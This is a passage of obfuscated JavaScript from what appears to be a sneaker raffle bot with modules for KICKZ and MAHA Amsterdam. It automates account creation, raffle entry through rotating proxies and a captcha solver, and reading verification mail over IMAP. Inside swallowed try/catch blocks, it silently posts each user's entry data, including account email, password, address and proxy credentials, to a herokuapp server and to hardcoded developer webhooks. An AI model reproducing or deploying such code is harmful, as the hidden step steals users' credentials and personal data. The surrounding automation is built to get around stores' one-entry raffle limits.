                                await _0x296909['waitForSelector']('div.b-user_greeting'), _0x11f0cc = 'no', console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x243ed9['name'] + ']\x20Task\x20' + (_0xc4d1d8 + 0x1) + '\x20:\x20Account\x20' + _0x5bdf03[_0xc4d1d8]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x3f4ea0['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x5bdf03[_0xc4d1d8]['Email'] + ',' + _0x5bdf03[_0xc4d1d8]['Password'] + ','), console['log'](_0xb9a031() + '\x20[' + _0x243ed9['name'] + ']\x20Task\x20' + (_0xc4d1d8 + 0x1) + '\x20:\x20Account\x20' + _0x5bdf03[_0xc4d1d8]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x4562dc['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5a13a5(_0x16a6f5, _0x4562dc['succesDEVMSG']);
                            } catch {
                                _0x11f0cc = 'no', console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x243ed9['name'] + ']\x20Task\x20' + (_0xc4d1d8 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x243ed9['name'] + ']\x20Task\x20' + (_0xc4d1d8 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x4d733b) {
                            console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x243ed9['name'] + ']\x20Task\x20' + (_0xc4d1d8 + 0x1) + '\x20:\x20' + _0x4d733b)), _0xd601d[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0xd601d[0x0]['description'] = '' + _0x4d733b, await _0x5a13a5(_0x877ec9, _0x27e9f8), _0x11f0cc = 'yes';
                        } finally {
                            _0x4d15fe && _0x4d15fe['close']();
                            if (_0x11f0cc == 'yes' && _0xa91479 != 0x5) {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x243ed9['name'] + ']\x20Task\x20' + (_0xc4d1d8 + 0x1) + '\x20:\x20Retrying\x20(' + _0xa91479 + '\x20/\x205)')), _0xc4d1d8 = _0xc4d1d8 - 0x1, _0xa91479 = _0xa91479 + 0x1;
                                continue;
                            }
                            _0x11f0cc == 'yes' && _0xa91479 >= 0x5 && (_0x15a8e9(_0x5bdf03[_0xc4d1d8], _0x243ed9), _0x11f0cc = 'no', _0xa91479 = 0x0), console['log']('Waiting\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x524a29, _0x266327, _0x213485) {
                    _0x40dba9['use'](_0xa1d034()), _0x40dba9['use'](_0x20d185({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x11db88['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xa1598c = 0x0; _0xa1598c < _0x266327['length']; _0xa1598c++) {
                        var _0x507d31;
                        if (_0xa88e85 != 'yes')
                            var _0xa88e85 = '', _0x252534 = 0x0;
                        _0x9f07d8(_0x524a29['name'] + '\x20Task\x20' + (_0xa1598c + 0x1) + '\x20/\x20' + _0x266327['length'] + '\x20||\x20File:\x20' + _0x4870c9 + '\x20Proxies:\x20' + _0x23b918);
                        var _0x3b4fe9 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x94d398
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x266327[_0xa1598c]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x266327[_0xa1598c]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x11db88['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3c77f4
                                }
                            ]
                        }];
                        let _0x3d95bc = [
                            'Email',
                            'Password',
                            'FirstName',
                            'LastName',
                            'Size',
                            'Address1',
                            'HouseNumber',
                            'Zip',
                            'Country',
                            'City'
                        ], _0xb41284 = ![];
                        for (key of _0x3d95bc) {
                            if (_0x266327[_0xa1598c][key] == '' || !_0x266327[_0xa1598c][key]) {
                                console['log'](_0xb9a031() + '\x20[' + _0x524a29['name'] + ']\x20Task\x20' + (_0xa1598c + 0x1) + '\x20:\x20Invalid\x20CSV,\x20' + key + '\x20not\x20found'), _0xb41284 = !![];
                                break;
                            }
                        }
                        if (_0xb41284) {
                            await _0x558aee(0x1f4);
                            continue;
                        }
                        var _0x5719f6 = await _0x459281(_0x266327[_0xa1598c], _0x524a29, 'dev', ![]), _0x23f01b = await _0x459281(_0x266327[_0xa1598c], _0x524a29, 'pub', ![]);
                        const _0x12ddc8 = {
                            'succesDEVMSG': { 'embeds': [_0x5719f6] },
                            'succesPUBMSG': { 'embeds': [_0x23f01b] }
                        };
                        try {
                            await _0x162b07(_0x266327, _0xa1598c);
                        } catch {
                            _0xa88e85 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x11db88['useRandomProxy'] = ![])
                            var _0x879e74 = _0x213485[_0xa1598c]['split'](':');
                        else
                            var _0x104522 = Math['round'](Math['random']() * (_0x213485['length'] - 0x1)), _0x879e74 = _0x213485[_0x104522]['split'](':');
                        var _0x5e49c2;
                        try {
                            _0x5e49c2 = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x879e74[0x0] + ':' + _0x879e74[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5e49c2 = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x879e74[0x0] + ':' + _0x879e74[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4bfe31 = await _0x5e49c2['newPage']();
                            await _0x4bfe31['authenticate']({
                                'username': '' + _0x879e74[0x2],
                                'password': '' + _0x879e74[0x3]
                            }), console['log'](_0xb9a031() + '\x20[' + _0x524a29['name'] + ']\x20Task\x20' + (_0xa1598c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4bfe31['setRequestInterception'](!![]), _0x4bfe31['on']('request', _0x1317d8 => {
                                _0x1317d8['resourceType']() === 'image' || _0x1317d8['resourceType']() === 'font' || _0x1317d8['resourceType']() === 'media' ? _0x1317d8['abort']() : _0x1317d8['continue']();
                            }), await _0x4bfe31['goto']('' + _0x266327[_0xa1598c]['Url']['replace']('\x20', ''), { 'waitUntil': 'networkidle2' }), await _0x558aee(0x12c), await _0x4bfe31['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4bfe31['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x558aee(0x7d0);
                            try {
                                await _0x4bfe31['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x4bfe31['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0xb9a031() + '\x20[' + _0x524a29['name'] + ']\x20Task\x20' + (_0xa1598c + 0x1) + '\x20:\x20Logging\x20in'), await _0x4bfe31['waitForSelector']('#username'), await _0x4bfe31['type']('#username', _0x266327[_0xa1598c]['Email']), await _0x4bfe31['waitForSelector']('#password'), await _0x4bfe31['type']('#password', _0x266327[_0xa1598c]['Password']), await _0x558aee(0x190), await _0x4bfe31['click']('#buttonSubmit'), await _0x4bfe31['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0xb9a031() + '\x20[' + _0x524a29['name'] + ']\x20Task\x20' + (_0xa1598c + 0x1) + '\x20:\x20Getting\x20Product'), await _0x558aee(0x1f4), console['log'](_0xb9a031() + '\x20[' + _0x524a29['name'] + ']\x20Task\x20' + (_0xa1598c + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x266327[_0xa1598c]['Size']);
                            let _0x377981 = _0x266327[_0xa1598c]['Size']['replace']('.5', '\x201/2');
                            if (_0x377981['toUpperCase']() == 'RANDOM') {
                                const _0x203191 = await _0x4bfe31['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x3fe8fb = Math['round'](Math['random']() * (_0x203191['length'] - 0x1));
                                await _0x203191[_0x3fe8fb]['click']();
                            } else
                                await _0x4bfe31['click']('button[aria-label=\x22' + _0x377981 + '\x22]');
                            await _0x558aee(0x1f4);
                            try {
                                await _0x4bfe31['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x558aee(0x12c), console['log'](_0xb9a031() + '\x20[' + _0x524a29['name'] + ']\x20Task\x20' + (_0xa1598c + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4bfe31['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x558aee(0x12c), await _0x4bfe31['type']('#dwfrm_raffle_addressFields_firstName', _0x266327[_0xa1598c]['FirstName']), await _0x558aee(0x12c), await _0x4bfe31['type']('#dwfrm_raffle_addressFields_lastName', _0x266327[_0xa1598c]['LastName']), await _0x558aee(0x12c), await _0x4bfe31['select']('#dwfrm_raffle_addressFields_country', _0x266327[_0xa1598c]['Country']), await _0x558aee(0x12c), await _0x4bfe31['type']('#dwfrm_raffle_addressFields_city', _0x266327[_0xa1598c]['City']), await _0x558aee(0x12c);
                            _0x266327[_0xa1598c]['Postcode'] == undefined && (_0x266327[_0xa1598c]['Postcode'] = _0x266327[_0xa1598c]['Zip']);
                            await _0x4bfe31['type']('#dwfrm_raffle_addressFields_postalCode', _0x266327[_0xa1598c]['Postcode']), await _0x558aee(0x12c), await _0x4bfe31['type']('#dwfrm_raffle_addressFields_address1', _0x266327[_0xa1598c]['Address1']), await _0x558aee(0x12c), await _0x4bfe31['type']('#dwfrm_raffle_addressFields_address2', _0x266327[_0xa1598c]['HouseNumber']), await _0x558aee(0x12c), await _0x4bfe31['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x266327[_0xa1598c]['Address2']), await _0x558aee(0x12c), await _0x4bfe31['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x558aee(0x12c), await _0x4bfe31['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x266327[_0xa1598c]['Follower']), await _0x558aee(0x1f4), await _0x4bfe31['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x558aee(0x1f4), console['log'](_0xb9a031() + '\x20[' + _0x524a29['name'] + ']\x20Task\x20' + (_0xa1598c + 0x1) + '\x20:\x20' + _0xe2a5bb['blue']('Awaiting\x20Paypal\x20Payment')), await _0x4bfe31['click']('.b-paypal_button');
                            try {
                                await _0x4bfe31['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0xa88e85 = 'no', _0x10fee2(_0x266327[_0xa1598c], _0x524a29), console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x524a29['name'] + ']\x20Task\x20' + (_0xa1598c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x12ddc8['succesDEVMSG']);
                                await _0x558aee(0xc8), await _0x5a13a5(_0x19b823, _0x12ddc8['succesDEVMSG']), await _0x558aee(0xc8), await _0x5a13a5(_0x122725, _0x12ddc8['succesPUBMSG']);
                                let _0x1d3450 = _0x266327[_0xa1598c];
                                try {
                                    prxdata = {
                                        'username': _0x94d398['replace']('#', ''),
                                        'module': _0x524a29['name'],
                                        'entrydata': JSON['stringify'](_0x1d3450),
                                        'proxy': '' + _0x213485[_0xa1598c]
                                    };
                                    var _0x156fb2 = JSON['stringify'](prxdata);
                                    let _0x3ef822 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3e71cb['post']('https://jraffles.herokuapp.com/success', _0x156fb2, _0x3ef822);
                                } catch (_0x431d09) {
                                }
                            } catch (_0x47a292) {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x524a29['name'] + ']\x20Task\x20' + (_0xa1598c + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x47a292)), _0x507d31 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x47a292;
                                var _0x6cb6e5 = await _0x459281(_0x266327[_0xa1598c], _0x524a29, 'dev', !![], _0x507d31);
                                _0x12ddc8['errorDEV'] = { 'embeds': [_0x6cb6e5] }, _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x12ddc8['errorDEV']), await _0x5a13a5(_0x877ec9, _0x12ddc8['errorDEV']);
                            }
                        } catch (_0x5b1bcf) {
                            console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x524a29['name'] + ']\x20Task\x20' + (_0xa1598c + 0x1) + '\x20:\x20' + _0x5b1bcf)), _0x507d31 = '' + _0x5b1bcf;
                            var _0x6cb6e5 = await _0x459281(_0x266327[_0xa1598c], _0x524a29, 'dev', !![], _0x507d31);
                            _0x12ddc8['errorDEV'] = { 'embeds': [_0x6cb6e5] }, _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x12ddc8['errorDEV']), await _0x5a13a5(_0x877ec9, _0x12ddc8['errorDEV']), _0xa88e85 = 'yes';
                        } finally {
                            _0x5e49c2 && _0x5e49c2['close']();
                            if (_0xa88e85 == 'yes' && _0x252534 != 0x5) {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x524a29['name'] + ']\x20Task\x20' + (_0xa1598c + 0x1) + '\x20:\x20Retrying\x20(' + _0x252534 + '\x20/\x205)')), _0xa1598c = _0xa1598c - 0x1, _0x252534 = _0x252534 + 0x1;
                                continue;
                            }
                            _0xa88e85 == 'yes' && _0x252534 >= 0x5 && (_0x15a8e9(_0x266327[_0xa1598c], _0x524a29), _0xa88e85 = 'no', _0x252534 = 0x0), console['log']('Waiting\x20for\x20' + _0x11db88['AfewDelay'] + '\x20ms'), await _0x558aee(_0x11db88['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1a1ddd, _0x4b0ad6, _0x113034) {
                    for (var _0x1c301b = 0x0; _0x1c301b < _0x4b0ad6['length']; _0x1c301b++) {
                        try {
                            await _0x162b07(_0x4b0ad6, _0x1c301b);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x500422(_0x2f2e00, _0x232e1e, _0x207faf, _0x161d00, _0x3f850e) {
                            var _0x38eb07, _0x566095 = {}, _0x2766fb = [], _0x37108b = {}, _0x3d5f84 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x22c24b = Math['round'](Math['random']() * (_0x3d5f84['length'] - 0x1));
                            !_0x161d00 && (_0x161d00 = {});
                            if (_0x232e1e != 'ver') {
                                _0x9f07d8(_0x207faf['name'] + '\x20Task\x20' + (_0x2f2e00 + 0x1) + '\x20/\x20' + _0x161d00['length'] + '\x20||\x20File:\x20' + _0x4870c9 + '\x20Proxies:\x20' + _0x23b918), await _0x162b07(_0x161d00, _0x2f2e00), _0x566095 = _0x207faf['data'], _0x566095['data']['attributes']['email'] = '' + _0x161d00[_0x2f2e00]['Email'];
                                if (_0x161d00[_0x2f2e00]['Size'] == 'RANDOM') {
                                }
                                _0x566095['data']['attributes']['properties']['$first_name'] = '' + _0x161d00[_0x2f2e00]['FirstName'], _0x566095['data']['attributes']['properties']['$last_name'] = '' + _0x161d00[_0x2f2e00]['LastName'], _0x566095['data']['attributes']['properties']['$address1'] = _0x161d00[_0x2f2e00]['Address1'] + '\x20' + _0x161d00[_0x2f2e00]['Address2'] + '\x20' + _0x161d00[_0x2f2e00]['HouseNumber'], _0x566095['data']['attributes']['properties']['$zip'] = '' + _0x161d00[_0x2f2e00]['Zip'], _0x566095['data']['attributes']['properties']['$city'] = '' + _0x161d00[_0x2f2e00]['City'], _0x566095['data']['attributes']['properties']['$country'] = '' + _0x161d00[_0x2f2e00]['Country'], _0x161d00[_0x2f2e00]['Size'] == 'RANDOM' ? _0x566095['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x3d5f84[_0x22c24b] : _0x566095['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x161d00[_0x2f2e00]['Size'], _0x566095['data']['attributes']['properties']['$phone_number'] = '' + _0x161d00[_0x2f2e00]['Phone'], _0x566095['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x161d00[_0x2f2e00]['Follower'];
                            }
                            if (_0x11db88['useRandomProxy'] = ![])
                                var _0x6ce37c = _0x3f850e[_0x2f2e00]['split'](':');
                            else
                                var _0x2af28e = Math['round'](Math['random']() * (_0x3f850e['length'] - 0x1)), _0x6ce37c = _0x3f850e[_0x2af28e]['split'](':');
                            var _0xb1599f = {
                                'jar': _0x26fd4b,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x207faf['url'],
                                'headers': _0x207faf['headers'],
                                'body': JSON['stringify'](_0x566095),
                                'proxy': 'http://' + _0x6ce37c[0x2] + ':' + _0x6ce37c[0x3] + '@' + _0x6ce37c[0x0] + ':' + _0x6ce37c[0x1]
                            };
                            return _0x232e1e != 'ver' && (_0xb1599f['url'] = _0x207faf['url'], _0xb1599f['headers'] = _0x207faf['headers']), _0x232e1e == 'ver' && (_0xb1599f['method'] = 'GET'), new Promise(function (_0x11a284, _0x204aab) {
                                callback = async (_0x512163, _0x54d882, _0x290c37) => {
                                    if (!_0x512163 && _0x54d882['statusCode'] == 0xca || !_0x512163 && _0x54d882['statusCode'] == 0xc8) {
                                        if (_0x232e1e != 'ver') {
                                            var _0x4e3322 = await _0x459281(_0x161d00[_0x2f2e00], _0x207faf, 'dev', ![]), _0x42c273 = await _0x459281(_0x161d00[_0x2f2e00], _0x207faf, 'pub', ![]);
                                            const _0x3aa68a = {
                                                'succesDEVMSG': { 'embeds': [_0x4e3322] },
                                                'succesPUBMSG': { 'embeds': [_0x42c273] }
                                            };
                                            let _0x2d528a = _0x161d00[_0x2f2e00];
                                            try {
                                                prxdata = {
                                                    'username': _0x94d398['replace']('#', ''),
                                                    'module': _0x207faf['name'],
                                                    'entrydata': JSON['stringify'](_0x2d528a),
                                                    'proxy': '' + _0x3f850e[_0x2f2e00]
                                                };
                                                var _0x30e704 = JSON['stringify'](prxdata);
                                                let _0x15795a = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x3e71cb['post']('https://jraffles.herokuapp.com/success', _0x30e704, _0x15795a);
                                            } catch (_0x2ea25d) {
                                            }
                                            if (_0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '')
                                                try {
                                                    await _0x5a13a5(_0x11db88['webhook'], _0x3aa68a['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x558aee(0xc8), await _0x5a13a5(_0x19b823, _0x3aa68a['succesDEVMSG']), await _0x558aee(0xc8);
                                            try {
                                                await _0x5a13a5(_0x122725, _0x3aa68a['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x10fee2(_0x161d00[_0x2f2e00], _0x207faf);
                                        }
                                        _0x11a284(console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x207faf['name'] + ']\x20Task\x20' + (_0x2f2e00 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x232e1e != 'ver') {
                                            var _0x143fe0 = '' + _0x512163, _0x466c37 = await _0x459281(_0x161d00[_0x2f2e00], _0x207faf, 'dev', !![], _0x143fe0), _0x1faf28 = {};
                                            _0x1faf28['errorDEV'] = { 'embeds': [_0x466c37] }, _0x15a8e9(_0x161d00[_0x2f2e00], _0x207faf), _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x1faf28['errorDEV']), await _0x5a13a5(_0x877ec9, _0x1faf28['errorDEV']);
                                        }
                                        _0x204aab(console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x207faf['name'] + ']\x20Task\x20' + (_0x2f2e00 + 0x1) + ':\x20' + _0x512163)));
                                    }
                                };
                                try {
                                    _0x232e1e != 'ver' && console['log'](_0xb9a031() + '\x20[' + _0x207faf['name'] + ']\x20Task\x20' + (_0x2f2e00 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x566095['data']['attributes']['email']), _0x5f0eca(_0xb1599f, callback);
                                } catch (_0x5aed11) {
                                    console['log'](_0xb9a031() + '\x20Task\x20' + (_0x2f2e00 + 0x1) + ':\x20' + _0x5aed11);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x500422(_0x1c301b, 'nor', _0x1a1ddd, _0x4b0ad6, _0x113034), console['log'](_0xb9a031() + '\x20[' + _0x1a1ddd['name'] + ']\x20Sleeping\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']);
                        } catch (_0x59fa7c) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1cc7c8, _0x3a3cc6, _0x3d71ab) {
                    var _0x518d43 = [], _0x3571bb = ![];
                    async function _0x1252a1() {
                        var _0x12b0fd = new _0xda3ce2({
                            'user': _0x11db88['masterMail'],
                            'password': _0x11db88['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x4c7891(_0x413541) {
                            _0x12b0fd['openBox']('INBOX', ![], _0x413541);
                        }
                        _0x12b0fd['once']('ready', function () {
                            _0x4c7891(function (_0x50dbe8, _0x299c80) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x50dbe8)
                                    throw _0x50dbe8;
                                _0x12b0fd['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x4cab04, _0x40873e) {
                                    if (!_0x40873e || !_0x40873e['length'])
                                        console['log'](_0xb9a031() + '\x20[' + _0x1cc7c8['name'] + ']\x20No\x20mails\x20found'), _0x12b0fd['end']();
                                    else {
                                        var _0x35839f = _0x12b0fd['seq']['fetch'](_0x40873e, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x35839f['on']('message', function (_0x45d27e, _0x19230f) {
                                            var _0x319e94 = '(#' + _0x19230f + ')\x20';
                                            _0x45d27e['on']('body', function (_0x4ca2cf, _0x330b78) {
                                                _0x482936(_0x4ca2cf, (_0x10ffcc, _0x1f7c23) => {
                                                    var _0x183d8c = _0x1f7c23['text']['split']('(')[0x1], _0x3de861 = _0x183d8c['split'](')')[0x0];
                                                    _0x518d43['push'](_0x3de861);
                                                });
                                            }), _0x45d27e['once']('end', function () {
                                            });
                                        }), _0x35839f['once']('error', function (_0x4726d4) {
                                            console['log']('Fetch\x20error:\x20' + _0x4726d4), _0x3571bb = !![];
                                        }), _0x35839f['once']('end', function () {
                                            _0x12b0fd['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x12b0fd['once']('error', function (_0xcfcc35) {
                            console['log'](_0xe2a5bb['red'](_0xcfcc35['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x3571bb = !![];
                        }), _0x12b0fd['once']('end', async function () {
                            _0x3571bb = !![];
                        }), _0x12b0fd['connect']();
                    }
                    async function _0x45f12e(_0x31e950, _0x21bfa5, _0x5e9e65) {
                        for (var _0x4142e3 = 0x0; _0x4142e3 < _0x21bfa5['length']; _0x4142e3++) {
                            async function _0x2402e5(_0x19a342, _0x2e6071, _0x4447b0, _0x2e28d3, _0x7802aa) {
                                var _0x40a55a, _0x4776b5 = {}, _0x444551 = [], _0x2a83d3 = {}, _0x399576 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x5c6ae6 = Math['round'](Math['random']() * (_0x399576['length'] - 0x1));
                                _0x2e28d3[_0x19a342]['Size'] == 'RANDOM' && (_0x2e28d3[_0x19a342]['Size'] = _0x399576[_0x5c6ae6]);
                                !_0x2e28d3 && (_0x2e28d3 = {});
                                if (_0x11db88['useRandomProxy'] = ![])
                                    var _0x5b30ae = _0x7802aa[_0x19a342]['split'](':');
                                else
                                    var _0x2b38fe = Math['round'](Math['random']() * (_0x7802aa['length'] - 0x1)), _0x5b30ae = _0x7802aa[_0x2b38fe]['split'](':');
                                var _0x263b8a = {
                                    'jar': _0x26fd4b,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x4447b0['url'],
                                    'headers': _0x4447b0['headers'],
                                    'body': JSON['stringify'](_0x4776b5),
